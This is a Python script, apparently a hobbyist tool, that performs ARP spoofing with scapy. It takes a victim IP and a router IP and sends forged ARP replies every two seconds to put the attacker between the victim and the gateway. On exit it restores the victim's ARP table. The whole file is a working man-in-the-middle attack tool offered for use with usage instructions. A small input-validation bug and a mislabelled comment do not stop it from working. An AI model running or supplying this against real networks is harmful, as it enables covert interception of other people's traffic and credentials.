
#!/usr/bin/env python 
import scapy.all as scapy 
import optparse
import time 
import sys 

#start the program! 
print(" ") 
print("            +----------------------------------+			")
print("            |            ARP Spoofer           |			")
print("            +----------------------------------+			")
print("            |  coded by Eslam Akl - @eslam3kl  |			")
print("            +----------------------------------+			")
print("[+] Usage: python arp_spoofer.py -v victim_ip -r router_ip \n[+] Note: if you don't specify the arguments, the request will sent to None\n-=-=-=-=-=-=-=-=-=-=-=-")

#get the user inputs 
def victim_router_ip(): 
	parser = optparse.OptionParser()
	parser.add_option("-v","--victim_ip",dest="ip",help="Victim's IP address")
	parser.add_option("-r","--router_ip",dest="router",help="Router's or gateway IP address")
	(options, arguments) = parser.parse_args()
	#check of the user input 
	if not options.ip and options.router: 
		print("[-] Enter the Victim's AND Router's IP address, see --help for more info")
		raise SystemExit 
	else: 
		return options.ip, options.router 

#function to get the mac address of the victim machine
def get_mac(ip): 
	arp_request = scapy.ARP(pdst=ip)
	broadcast_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_broadcast_request = broadcast_request / arp_request 
	answered = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
	for element in answered: 
		return(element[1][0].src)

#function to spoof the arp request
def spoof(victim_ip, router_ip): 
	victim_mac = get_mac(victim_ip)
	packet = scapy.ARP(op=2, hwdst=victim_mac, psrc=router_ip, pdst=victim_ip) 
	scapy.send(packet, verbose=False)

#function to restore the dns tables in the victim machine 
def restore(destination_ip, source_ip):
	source_mac = get_mac(source_ip) 
	destination_mac = get_mac(destination_ip) 
	packet = scapy.ARP(op=2, hwdst=destination_mac, psrc=source_ip, pdst=destination_ip, hwsrc=source_mac)	
	scapy.send(packet, count=4, verbose=False)


#starting the main function 
ips = victim_router_ip()
print("[+] Starting to send the packets every 2 seconds...")
cnt = 0
#try and except blocks: 
try: 
	while True: 
		print("\r[+] Packets sent: " + str(cnt)), 
		sys.stdout.flush()
		spoof(ips[0], ips[1])
		cnt = cnt + 2
		time.sleep(2) 
except KeyboardInterrupt: 
	print("\n\n[-] Exit! Happy to work with you, GoodBye Bro ")
	restore(ips[0], ips[1])




